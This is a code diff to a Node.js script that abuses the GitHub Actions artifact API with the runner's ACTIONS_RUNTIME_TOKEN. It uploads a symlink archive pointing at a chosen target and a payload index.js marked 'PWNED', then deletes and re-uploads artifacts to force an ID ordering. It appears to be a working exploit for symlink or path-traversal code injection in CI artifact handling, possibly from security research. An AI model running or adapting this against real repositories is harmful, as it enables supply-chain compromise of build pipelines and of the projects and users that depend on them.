@@ -150,20 +150,52 @@ async function upload(name, zipBuf) {
     hash: 'sha256:' + crypto.createHash('sha256').update(zipBuf).digest('hex')
   });
   console.log(`FINAL[${name}] ${fin.status} ${fin.body.slice(0, 300)}`);
+  if (fin.status === 200) {
+    const fj = JSON.parse(fin.body);
+    return String(fj.artifactId || fj.artifact_id || '');
+  }
+  return null;
+}
+
+async function del(name) {
+  const token = process.env.ACTIONS_RUNTIME_TOKEN;
+  const base = new URL(process.env.ACTIONS_RESULTS_URL).origin;
+  const claims = JSON.parse(b64urlDecode(token.split('.')[1]));
+  let runId = null, jobId = null;
+  for (const s of (claims.scp || '').split(' ')) {
+    if (s.startsWith('Actions.Results:')) { const p = s.split(':'); runId = p[1]; jobId = p[2]; }
+  }
+  const r = await httpJson(`${base}/twirp/github.actions.results.api.v1.ArtifactService/DeleteArtifact`, token,
+    {workflowRunBackendId: runId, workflowJobRunBackendId: jobId, name});
+  console.log(`DELETE[${name}] ${r.status} ${r.body.slice(0, 200)}`);
+  return r.status === 200;
 }
 
 (async () => {
   const target = process.env.SYMTARGET;
   const payload = process.env.PAYLOAD_SRC || "console.log('PWNED_DEFAULT');";
-  const n = parseInt(process.env.NPAY || '10', 10);
-  const m = parseInt(process.env.NFILL || '10', 10);
-  const symEntries = [];
-  for (let i = 0; i < n; i++) symEntries.push({name: 'p' + i, content: target, mode: 0o120777 * 65536});
-  await upload('.', makeZip(symEntries));
-  for (let i = 0; i < n; i++) {
-    await upload('p' + i, makeZip([{name: 'index.js', content: payload, mode: 0o100644 * 65536}]));
+  const symZip = () => makeZip([{name: 'p', content: target, mode: 0o120777 * 65536}]);
+  const payZip = makeZip([{name: 'index.js', content: payload, mode: 0o100644 * 65536}]);
+  const fillZip = makeZip([{name: 'f.txt', content: 'filler', mode: 0o100644 * 65536}]);
+
+  let idPay = null, idDot = null;
+  for (let attempt = 0; attempt < 8; attempt++) {
+    if (idPay !== null) await del('p');
+    if (idDot !== null) await del('.');
+    idPay = await upload('p', payZip);
+    idDot = await upload('.', symZip());
+    console.log(`IDS attempt=${attempt} dot=${idDot} pay=${idPay}`);
+    if (idPay && idDot && BigInt(idDot) > BigInt(idPay)) break;
+    idDot = null;
   }
-  for (let i = 0; i < m; i++) {
-    await upload('y' + i, makeZip([{name: 'f' + i + '.txt', content: 'filler', mode: 0o100644 * 65536}]));
+  if (!idDot || BigInt(idDot) <= BigInt(idPay)) { console.log('ORDER_FAILED_GIVING_UP'); return; }
+  let idY = null;
+  for (let attempt = 0; attempt < 8; attempt++) {
+    if (idY !== null) await del('y');
+    idY = await upload('y', fillZip);
+    console.log(`IDS y attempt=${attempt} y=${idY} pay=${idPay}`);
+    if (idY && BigInt(idY) < BigInt(idPay)) break;
+    idY = null;
   }
+  console.log('FINAL_IDS dot=' + idDot + ' pay=' + idPay + ' y=' + idY);
 })().catch(e => { console.log('ERROR ' + e.stack); process.exit(1); });
